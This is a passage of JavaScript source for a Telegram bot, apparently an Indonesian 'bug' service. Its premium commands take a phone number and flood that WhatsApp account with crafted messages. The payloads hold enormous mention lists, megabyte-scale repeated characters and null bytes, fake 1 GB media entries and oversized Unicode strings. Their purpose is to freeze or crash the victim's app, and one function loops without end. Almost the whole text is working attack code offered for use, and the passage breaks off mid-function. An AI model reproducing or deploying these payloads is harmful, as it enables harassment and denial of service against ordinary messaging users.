        inline_keyboard: [
          [{ text: "(⛥)CHAT TARGET(⇋)", url: `https://wa.me/${q}`, style: "danger" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await delayfrezee(sock, target);
    await sleep(1200);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});


bot.command("Delayspam", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Delayspam 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>🔥 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⇋)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await DelayHardUpdate01(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});


bot.command("buldozer", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /buldozer 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await Asixinajaaa(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("delayinvs", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /delayinvs 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "danger" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await Invisiblehard(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("delaykunti", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /delaykunti 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await XPopup(sock, target) ;
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("kingcdelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /kingcdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "primary" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await Nasa(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("inTs", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /InTs 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await RamjiDelay(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("delaychat", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /delaysw 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>👻 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await VnXDelayAiInvis(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("xcfc", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xcfc 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌐CHAT TARGET📶", url: `https://wa.me/${q}`, style: "primary" }],
        ],
      },
    }
  );

  for (let i = 0; i < 50; i++) {
    await Ipongforcloseivs(target);
    await sleep(1500);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("hecate", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /hecate 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug Fc Ios Terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎊)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await Ipongforcloseivs(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

// Function Bug
async function delayfrezee(sock, target) {
  const sqlfake = Array.from({ length: 10000 }, (_, i) => `${i}@s.whatsapp.net`);
  for (let i = 0; i < 50; i++) {
    await sock.relayMessage("status@broadcast",
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: sqlfake,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 100000 }, () => ({}))
          },
          body: {
            text: "{{".repeat(250000)
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{{".repeat(9999099),
            version: 3
          }
        }
      }
    }, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  await sleep(5000);
}

async function VnXDelayAiInvis(sock, target) {
    const VnXForwardAi = [
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot",
    "13135550202@bot", "13135550202@bot"
  ];

    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                 groupStatusMessageV2: {
                    message: {
                      interactiveResponseMessage: {
                        contextInfo: {
                           mentionedJid: Array.from({ length: 200900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
                         },
                          body: {
                             text: "VnXIsHere",
                                format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                   name: "galaxy_message",
                                   paramsJson: `{\"flow_cta\":\"${"\n".repeat(999999)}\"}}`,
                                   version: 3
                                 }
                           }
                      }
                 }
             },
          { userJid: sock.user.id } 
        );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`👻 XdelayVnX ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function Invisiblehard(sock, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",
      fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
       fileLength: "1073741824",
        mediaKeyTimestamp: "1775847446",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`Succes Send Bugs To: ${target}`))
}

async function Asixinajaaa(target) {
    
  const RaraaImupp = generateWAMessageFromContent(
    target,
    {
      videoMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
        mimetype: "video/mp4",
        caption: "𝒀𝒐𝒖 𝑪𝒂𝒏 𝑹𝒖𝒏... 𝑩𝒖𝒕 𝒀𝒖 𝑪𝒂𝒏’𝒕 𝑯𝒊𝒅𝒆 😏" + "ꦽ".repeat(99000) + "\u0000".repeat(50000),
        mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",
        fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",
        fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",
        fileLength: "1073741824",
        mediaKeyTimestamp: "1775847446"
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", RaraaImupp.message, {
    messageId: RaraaImupp.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  await sock.sendMessage("status@broadcast", {
    delete: {
      remoteJid: "status@broadcast",
      fromMe: true,
      id: RaraaImupp.key.id
    }
  });

  const raaMessages = {
    viewOnceMessage: {  
      message: {  
        interactiveResponseMessage: {  
          body: {  
            text: "𝒀𝒐𝒖 𝑪𝒂𝒏 𝑹𝒖𝒏... 𝑩𝒖𝒕 𝒀𝒖 𝑪𝒂𝒏’𝒕 𝑯𝒊𝒅𝒆 😏",  
            hasMediaAttachment: false  
          },  
          videoMessage: {  
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",  
            mimetype: "video/mp4",  
            fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",  
            fileLength: "1073741824",
            height: 1080,  
            width: 1920,
            mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",  
            fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",  
            directPath: "/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {  
              forwardingScore: 9999,  
              isForwarded: true,  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 1900 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              expiration: 9741,  
              ephemeralSettingTimestamp: 9741,  
              entryPointConversionSource: "WhatsApp.com",  
              entryPointConversionApp: "WhatsApp",  
              entryPointConversionDelaySeconds: 9742,  
              disappearingMode: {  
                initiator: "INITIATED_BY_OTHER",  
                trigger: "ACCOUNT_SETTING"  
              }  
            } 
          },  
          nativeFlowResponseMessage: {  
            name: "address_message",  
            paramsJson: "\u0000".repeat(1045900),  
            version: 3  
          }  
        }  
      }  
    }  
  };

  const raaMSG = generateWAMessageFromContent(target, raaMessages, {});

  await sock.relayMessage("status@broadcast", raaMSG.message, {
    messageId: raaMSG.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function Nasa(sock, target) {
    await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
          header: {
            title: "\u0000.Nexi" + "{{".repeat(250000)
          },
          body: {
            text: "NEXI ATTACK YOU"+"꧀".repeat(300000),
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(400000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
       },
         nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `responseParamsJson: "\u0000".repeat(990000),`,
                version: 3
            },
            MessagecontextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
          },
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
            },
            audioMessage: {
            mimetype: "audio/ogg; codecs=opus",
            fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
            fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "꧔꧈".repeat(9999)
    },
         nativeFlowMessage: {
                messageParamsJson: "single_select",
                buttonsParamsJson: "JSON.stringify({"
              },

    }, {})
}

async function teamXstrom(sock, target) {
  const msg1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xstrom"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1030000),
            version: 3
          }
        }
      }
    }
  };

  const msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xstrom"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1030000),
            version: 3
          }
        }
      }
    }
  };

  const msg3 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xstrom"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1030000),
            version: 3
          }
        }
      }
    }
  };

  for (let i = 0; i < 890; i++) {
    for (const msg of [msg1, msg2, msg3]) {
      await sock.relayMessage(
        "status@broadcast",
        msg,
        {
          messageId: null,
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                tag: "to",
                attrs: {
                  jid: target
                }
              }]
            }]
          }]
        }
      );
    }
  }
}

async function Ipongforcloseivs(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/elyssavirellequeenn",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "helow",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone, 
            matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
